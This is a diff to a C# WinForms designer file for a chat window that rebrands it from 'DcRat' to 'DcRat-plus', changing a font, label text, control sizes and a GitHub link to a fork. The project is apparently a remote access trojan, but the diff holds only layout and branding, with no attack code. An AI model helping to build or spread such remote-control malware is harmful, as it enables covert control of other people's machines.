@@ -75,12 +75,12 @@
             // label1
             // 
             this.label1.AutoSize = true;
-            this.label1.Font = new System.Drawing.Font("SWItalt", 15F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.label1.Location = new System.Drawing.Point(370, 157);
+            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 15F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label1.Location = new System.Drawing.Point(370, 158);
             this.label1.Name = "label1";
-            this.label1.Size = new System.Drawing.Size(103, 78);
+            this.label1.Size = new System.Drawing.Size(108, 75);
             this.label1.TabIndex = 6;
-            this.label1.Text = "Control\r\nBy\r\nDcRat";
+            this.label1.Text = "Control\r\nBy\r\nDcRat-plus";
             // 
             // textBox1
             // 
@@ -107,19 +107,19 @@
             this.label2.Font = new System.Drawing.Font("Comic Sans MS", 9F, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.label2.Location = new System.Drawing.Point(12, 454);
             this.label2.Name = "label2";
-            this.label2.Size = new System.Drawing.Size(105, 17);
+            this.label2.Size = new System.Drawing.Size(131, 17);
             this.label2.TabIndex = 10;
-            this.label2.Text = "Control By DcRat";
+            this.label2.Text = "Control By DcRat-plus";
             // 
             // linkLabel1
             // 
             this.linkLabel1.AutoSize = true;
-            this.linkLabel1.Location = new System.Drawing.Point(275, 457);
+            this.linkLabel1.Location = new System.Drawing.Point(215, 457);
             this.linkLabel1.Name = "linkLabel1";
-            this.linkLabel1.Size = new System.Drawing.Size(215, 12);
+            this.linkLabel1.Size = new System.Drawing.Size(263, 12);
             this.linkLabel1.TabIndex = 11;
             this.linkLabel1.TabStop = true;
-            this.linkLabel1.Text = "https://github.com/qwqdanchun/DcRat";
+            this.linkLabel1.Text = "https://github.com/BoheSama1999/DC-rat-plus";
             this.linkLabel1.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkLabel1_LinkClicked);
             // 
             // FormChat
@@ -127,7 +127,7 @@
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.BackColor = System.Drawing.SystemColors.Window;
-            this.ClientSize = new System.Drawing.Size(494, 480);
+            this.ClientSize = new System.Drawing.Size(490, 476);
             this.ControlBox = false;
             this.Controls.Add(this.linkLabel1);
             this.Controls.Add(this.label2);
